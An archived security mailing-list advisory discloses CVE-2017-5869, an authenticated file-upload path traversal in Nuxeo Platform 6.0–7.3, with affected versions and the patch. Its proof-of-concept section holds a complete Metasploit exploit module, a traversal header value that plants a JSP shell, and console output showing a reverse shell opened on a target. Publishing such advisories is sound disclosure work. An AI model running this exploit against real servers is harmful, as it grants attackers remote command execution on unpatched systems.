X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9059" "Thursday" "23" "March" "2017" "16:39:20" "+0100" "Sydream Labs" "labs@sysdream.com" "<356c77ed-5daf-2662-27ca-96951c90f20e@sysdream.com>" "277" "[oss-security] [CVE-2017-5869] Nuxeo Platform remote code execution" nil nil nil "3" "2017032315:39:20" "[oss-security] [CVE-2017-5869] Nuxeo Platform remote code execution" (number mark "U       labs@sysdrea Mar 23  277/9059  " thread-indent "\"[oss-security] [CVE-2017-5869] Nuxeo Platform remote code execution\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26165 invoked by uid 550); 23 Mar 2017 15:39:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26141 invoked from network); 23 Mar 2017 15:39:36 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 4AE141A0C56
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1490283561;
	bh=qWfxspI7hBvTxJiWlV1ut0boBUWKH3+eposn0s6ilyQ=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=pzqbrsihYqo2g7wu1A+kgC90POom/+rhrAw5Xd/UfgaVHpmyjI1cX58OohFbAuCFG
	 Z5Ui0aAUxW2A6WoVulcI+D/h96789EQgW4XZekeaJk/rXBof/N1qHel5zO1qFqD1Uk
	 lR9XsRJk2qNcPFYihrn9buA/IMr7i8KfNCMyMd0A=
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
Cc: cve@mitre.org
From: Sydream Labs <labs@sysdream.com>
Message-ID: <356c77ed-5daf-2662-27ca-96951c90f20e@sysdream.com>
Date: Thu, 23 Mar 2017 16:39:20 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="81764Vrd2LhtlH1LJkoXcQOo7uk2W5ejd"
Subject: [oss-security] [CVE-2017-5869] Nuxeo Platform remote code execution

--81764Vrd2LhtlH1LJkoXcQOo7uk2W5ejd
Content-Type: multipart/mixed; boundary="GU8KC6VWGDAvOW7NjD1ko6muB0qEtTtDL";
 protected-headers="v1"
From: Sydream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
Cc: cve@mitre.org
Message-ID: <356c77ed-5daf-2662-27ca-96951c90f20e@sysdream.com>
Subject: [CVE-2017-5869] Nuxeo Platform remote code execution

--GU8KC6VWGDAvOW7NjD1ko6muB0qEtTtDL
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

# Description

Nuxeo Platform is a content management system for enterprises (CMS).
It embeds an Apache Tomcat server, and can be managed through a web
interface.

One of its features allows authenticated users to import files to the
platform.
By crafting the upload request with a specific ``X-File-Name`` header,
one can successfuly upload a file at an arbitrary location of the server
file system.

It is then possible to upload a JSP script to the root directory of the
web application to execute commands on the remote host operating system.
Setting the value ``../../nxserver/nuxeo.war/shell.jsp`` to the
``X-File-Name`` header is a way to do so.

## Details

**CVE ID**: CVE-2017-5869

**Access Vector**: network

**Security Risk**: high

**Vulnerability**: CWE-434

**CVSS Base Score**: 8.8

**CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

# Proof of Concept

Here is a metasploit module to exploit this vulnerability:

```ruby
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
    Rank =3D ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

    def initialize(info=3D{})
        super(update_info(info,
            'Name'              =3D> "Nuxeo Platform File Upload RCE",
            'Description'       =3D> %q{
                The Nuxeo Platform tool is vulnerable to an
authenticated remote code execution,
                thanks to an upload module.
            },
            'License'           =3D> MSF_LICENSE,
            'Author'            =3D> ['Ronan Kervella
<r.kervella@sysdream.com>'],
            'References'        =3D>
                [
                    ['https://nuxeo.com/', '']
                ],
            'Platform'          =3D> %w{linux},
            'Targets'           =3D> [ ['Nuxeo Platform 6.0 to 7.3',
'Platform' =3D> 'linux'] ],
            'Arch'              =3D> ARCH_JAVA,
            'Privileged'        =3D> true,
            'Payload'           =3D> {},
            'DisclosureDate'    =3D> "",
            'DefaultTarget'     =3D> 0))
        register_options(
            [
                OptString.new('TARGETURI', [true, 'The path to the nuxeo
application', '/nuxeo']),
                OptString.new('USERNAME', [true, 'A valid username', '']),
                OptString.new('PASSWORD', [true, 'Password linked to the
username', ''])
            ], self.class)
    end

    def jsp_filename
        @jsp_filename ||=3D Rex::Text::rand_text_alpha(8) + '.jsp'
    end

    def jsp_path
        'nxserver/nuxeo.war/' + jsp_filename
    end

    def nuxeo_login
        res =3D send_request_cgi(
            'method' =3D> 'GET',
            'uri'    =3D> normalize_uri(target_uri.path, '/login.jsp')
        )

        fail_with(Failure::Unreachable, 'No response received from the
target.') unless res
        session_cookie =3D res.get_cookies

        res =3D send_request_cgi(
            'method'    =3D> 'POST',
            'uri'       =3D> normalize_uri(target_uri.path,
'/nxstartup.faces'),
            'cookie'    =3D> session_cookie,
            'vars_post' =3D> {
                'user_name'     =3D> datastore['USERNAME'],
                'user_password' =3D> datastore['PASSWORD'],
                'submit'        =3D> 'Connexion'
            }
        )
        return session_cookie if res && res.code =3D=3D 302 &&
res.redirection.to_s.include?('view_home.faces')
        nil
    end

    def trigger_shell
        res =3D send_request_cgi(
            'method'    =3D> 'GET',
            'uri'       =3D> normalize_uri(target_uri.path, jsp_filename)
        )
        fail_with(Failure::Unknown, 'Unable to get
#{full_uri}/#{jsp_filename}') unless res && res.code =3D=3D 200
    end

    def exploit
        print_status("Authenticating using
#{datastore['USERNAME']}:#{datastore['PASSWORD']}")
        session_cookie =3D nuxeo_login
        if session_cookie
            payload_url =3D normalize_uri(target_uri.path, jsp_filename)
            res =3D send_request_cgi(
                'method'    =3D> 'POST',
                'uri'       =3D> normalize_uri(target_uri.path,
'/site/automation/batch/upload'),
                'cookie'    =3D> session_cookie,
                'headers'    =3D> {
                    'X-File-Name'   =3D> '../../' + jsp_path,
                    'X-Batch-Id'    =3D> '00',
                    'X-File-Size'   =3D> '1024',
                    'X-File-Type'   =3D> '',
                    'X-File-Idx'    =3D> '0',
                    'X-Requested-With'  =3D> 'XMLHttpRequest'
                },
                'ctype'             =3D> '',
                'data' =3D> payload.encoded
            )
            fail_with(Failure::Unknown, 'Unable to upload the payload')
unless res && res.code =3D=3D 200
            print_status("Executing the payload at
#{normalize_uri(target_uri.path, payload_url)}.")
            trigger_shell
        else
            fail_with(Failure::Unknown, 'Unable to login')
        end
    end

end
```

Module output:

```bash
msf> use exploit/multi/http/nuxeo
msf exploit(nuxeo) > set USERNAME user1
USERNAME =3D> user1
msf exploit(nuxeo) > set PASSWORD password
PASSWORD =3D> password
msf exploit(nuxeo) > set rhost 192.168.253.132
rhost =3D> 192.168.253.132
msf exploit(nuxeo) > set payload java/jsp_shell_reverse_tcp
payload =3D> java/jsp_shell_reverse_tcp
msf exploit(nuxeo) > set lhost 192.168.253.1
lhost =3D> 192.168.253.1
msf exploit(nuxeo) > exploit

[-] Handler failed to bind to 192.168.253.1:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Authenticating using user1:password
[*] Executing the payload at /nuxeo/nuxeo/QBCefwxQ.jsp.
[*] Command shell session 1 opened (172.17.0.2:4444 ->
192.168.253.132:43279) at 2017-01-13 14:47:25 +0000

id
uid=3D1000(nuxeo) gid=3D1000(nuxeo)
groups=3D1000(nuxeo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpad=
min),110(sambashare)
pwd
/var/lib/nuxeo/server
```

# Vulnerable code

The vulnerable code is located in the
`org.nuxeo.ecm.restapi.server.jaxrs.BatchUploadObject` class ([github
link](https://github.com/nuxeo/nuxeo/blob/b05dde789a6c0c7b5f361608eb6d6bd0f=
da31f36/nuxeo-features/rest-api/nuxeo-rest-api-server/src/main/java/org/nux=
eo/ecm/restapi/server/jaxrs/BatchUploadObject.java#L150)),
where the header ``X-File-Name`` is not checked.

# Fix

Nuxeo provided a
[patch](https://github.com/nuxeo/nuxeo/commit/6b3113977ef6c2307f940849a2c19=
6621ebf1892)
for this issue.
A hotfix release is also available for Nuxeo 6.0 (Nuxeo 6.0 HF35).

Please note that vulnerability does not affect Nuxeo versions above 7.3.

# Affected versions

* Nuxeo 6.0 (LTS 2014), released 2014-11-06
* Nuxeo 7.1 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-01-15
* Nuxeo 7.2 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-03-24
* Nuxeo 7.3 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-06-24

# Unaffected versions

* Nuxeo 6.0 HF35, released 2017-01-12
* Nuxeo 7.4 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-10-02
* Nuxeo 7.10 (LTS 2015), released 2015-11-09
* Nuxeo 8.10 (LTS 2016), released 2016-12-06

# Credits

Ronan Kervella <r.kervella@sysdream.com>

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--GU8KC6VWGDAvOW7NjD1ko6muB0qEtTtDL--

--81764Vrd2LhtlH1LJkoXcQOo7uk2W5ejd
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIvBAEBCAAZBQJY0+woEhxsYWJzQHN5c2RyZWFtLmNvbQAKCRCOtIzZ1bJZoQB0
EACEaFFUH7DH0L+snaGxOLkWkx+ZDBuXW2hQ5SBEG7IW3UcB3UX9jGF55Ut0It1i
fyc8672K4Pt9CDR9mz/sTZbUNVkSuUjwXcrooThTWSnMqNgRA2yN2IqbD01o6/ci
UkW/h4YLlNeh/Bqi8vfjizq3DWEKanoO/p5Ohu/G9/YD+OCY+FX2Xy4xuaFdr83R
oamkiWIxLh5dsWWQnD3s16R02ZXkFQXxa42KyyIIZPuEx//o+oAaYClnZz/xtfu/
N3FzoVZ8w1WNR5LTyUPjMCi0z8KRjEzxjh49bLBf53dS1gudkzcH4KQGauQnQEj5
4JBZqdY+TpLJBUPGbNLfuMDJWEHgpmAOlT2DmmlgfiL+OjqKXKx1YKkcALovIgV4
oEJlzhs8C2Tl/xco0aNJl0tkZdCTXrVQMoUmkb/QBH+yqIGS6cjQQFyZcfrFLK8a
pujWbCmBcYNY4ghgWDKZP6fmvVajcFkui1+IqJCk1dhX8mKQokBZqrO2sQAyug9U
qkHimz8qw1iqKLl2G3U4QvHIN52R82iSJxq4Ms3pZMc+Q+hT1oCFPlZSatAgwMc3
W2nJxREO+0ZQzWusMWePJn1rmTV7Pv5UjNfArif/F4pQoXwePe916O8QTx09Uhnw
rLidfhWKwA7BaQKFclTE+VDrdTCfmK5hv2RzndGXOvn9GA==
=fwGQ
-----END PGP SIGNATURE-----

--81764Vrd2LhtlH1LJkoXcQOo7uk2W5ejd--
